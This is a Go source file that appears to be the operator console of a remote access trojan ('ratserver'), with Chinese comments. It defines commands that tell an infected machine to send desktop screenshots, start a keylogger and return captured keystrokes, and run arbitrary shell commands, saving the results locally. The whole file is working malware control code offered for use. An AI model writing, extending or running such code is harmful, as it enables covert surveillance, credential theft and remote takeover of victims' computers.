package server

import (
	"bufio"
	"fmt"
	"os"
	"time"

	"github.com/desertbit/grumble"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"wgp.ratserver/public"
)

func init() {
	// 获取桌面截图
	screenshotCommand := &grumble.Command{
		Name: "screen",
		Help: "Take a picture of the screen",
		Run: func(c *grumble.Context) error {
			conn := public.CurrClient.Conn
			conn.Write([]byte("screen"))

			reader := bufio.NewReader(conn)
			var buf [128]byte
			tmpfilename := getSaveFile("desktop", "png")
			file, _ := os.Create(tmpfilename)
			defer file.Close()
			for {
				n, err := reader.Read(buf[:])
				if err != nil {
					break
				}
				file.Write(buf[:])
				if n < 128 {
					break
				}
			}
			fmt.Println("[+] Desktop picture has been saved, location tmpfilename -> ", tmpfilename)
			return nil
		},
	}
	SessionCommand.AddCommand(screenshotCommand)

	// 关闭session
	colseCommand := &grumble.Command{
		Name: "colse",
		Help: "close the session",
		Run: func(c *grumble.Context) error {
			conn := public.CurrClient.Conn
			conn.Write([]byte("colse"))
			conn.Close()
			fmt.Println("colse the session")
			return nil
		},
	}
	SessionCommand.AddCommand(colseCommand)

	// 开启键盘记录
	keyloggerCommand := &grumble.Command{
		Name: "keystart",
		Help: "Monitor keyboard input",
		Run: func(c *grumble.Context) error {
			conn := public.CurrClient.Conn
			buffer := make([]byte, 200)
			conn.Write([]byte("keystart"))
			conn.Read(buffer)
			fmt.Println(string(buffer))
			return nil
		},
	}
	SessionCommand.AddCommand(keyloggerCommand)

	// 获取键盘记录信息
	keygetCommand := &grumble.Command{
		Name: "keyget",
		Help: "get keyboard input",
		Run: func(c *grumble.Context) error {
			conn := public.CurrClient.Conn
			conn.Write([]byte("keyget"))
			reader := bufio.NewReader(conn)
			var buf [128]byte
			tmpfilename := getSaveFile("keylogger", "txt")
			file, _ := os.Create(tmpfilename)
			defer file.Close()
			for {
				n, err := reader.Read(buf[:])
				if err != nil {
					break
				}
				file.Write(buf[:])
				if n < 128 {
					break
				}
			}
			fmt.Println("[+] Keylogger file has been saved, location tmpfilename -> ", tmpfilename)
			return nil
		},
	}
	SessionCommand.AddCommand(keygetCommand)

	// 执行cmd命令
	cmdCommand := &grumble.Command{
		Name: "cmd",
		Help: "execute cmd command",
		Args: func(a *grumble.Args) {
			a.String("command", "command string", grumble.Default(""))
		},
		Run: func(c *grumble.Context) error {
			command := c.Args.String("command")
			if command == "" {
				fmt.Println("[-] please enter the command")
				return nil
			}
			conn := public.CurrClient.Conn
			str := fmt.Sprintf("%s|%s", "cmd", c.Args.String("command"))
			conn.Write([]byte(str))
			reader := transform.NewReader(conn, simplifiedchinese.GBK.NewDecoder())
			var buf [128]byte
			var result string
			for {
				n, err := reader.Read(buf[:])
				if err != nil {
					break
				}
				result += string(buf[:])
				if n < 128 {
					break
				}
			}
			fmt.Println(result)
			return nil
		},
	}
	SessionCommand.AddCommand(cmdCommand)
}

// 获取临时文件名
func getSaveFile(pre string, ext string) string {
	filename := fmt.Sprintf("./%s-%d-%d-%d-%d-%d-%d.%s",
		pre,
		time.Now().Year(),
		time.Now().Month(),
		time.Now().Day(),
		time.Now().Hour(),
		time.Now().Minute(),
		time.Now().Second(),
		ext,
	)
	return filename
}
